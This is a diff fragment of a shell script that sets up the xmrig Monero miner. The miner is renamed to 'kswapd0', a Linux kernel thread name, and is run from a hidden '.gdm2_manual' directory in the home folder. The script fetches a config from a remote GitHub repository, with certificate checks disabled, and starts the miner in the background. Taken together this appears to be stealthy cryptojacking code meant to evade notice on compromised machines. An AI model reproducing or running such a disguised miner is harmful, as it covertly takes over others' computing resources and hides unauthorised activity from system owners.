@@ -6,7 +6,7 @@ mv xmrig kswapd0
 rm -rf config.json
 wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 curl -O https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
-./kswapd0&
+../kswapd0 --config=config.json &
 
 #tar xf $HOME/.gdm2_manual/xmrig.tar.gz
 #rm $HOME/.gdm2_manual/xmrig.tar.gz
